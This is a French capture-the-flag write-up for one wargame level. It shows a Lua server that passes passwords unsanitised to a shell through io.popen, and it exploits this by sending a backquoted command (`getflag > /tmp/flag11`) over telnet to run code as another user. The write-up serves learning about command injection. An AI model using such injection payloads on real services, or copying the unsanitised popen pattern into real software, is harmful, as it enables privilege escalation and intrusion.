# Level 11

Comme d'habitude un fichier est présent dans le home `level11.lua`.

On peut voir que le fichier ici présent est une sorte de serveur qui écoute sur le port `5151`, prend un password et affiche une réponse si le sha1sum est égale à `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0`

```sh
~ lua level11.lua
lua: level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	level11.lua:3: in main chunk
	[C]: ?
```

Comme on peut le voir ici, lorsque qu'on lance le fichier il nous dit qu'il existe déjà un process qui écoute sur le port `5151`. Nous pouvons vérifier en lancant la commande `ps`

```sh
~ ps -aux
[...]
flag11    1825  0.0  0.0   2896   960 ?        S    09:26   0:00 lua /home/user/level11/level11.lua
[...]
```

Nous pouvons voir que le processus est lancé avec l'utilisateur `flag11`.

En examinant mieux le code du fichier, on peut voir qu'il utilise `echo ...` pour hashé le password.

```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end
```

Comme d'habitude nous pouvons éxecuter une autre commande en même temps avec des `backquote`.

Il nous suffit alors de nous connecter au serveur lancé, par exemple avec `telnet` et de taper dans `Password` la commande que nous voulons executer. Ici `getflag > /tmp/flag11`

```sh
~ telnet localhost 5151
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: `getflag > /tmp/flag11`
Erf nope..
Connection closed by foreign host.

~ cat /tmp/flag11
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```




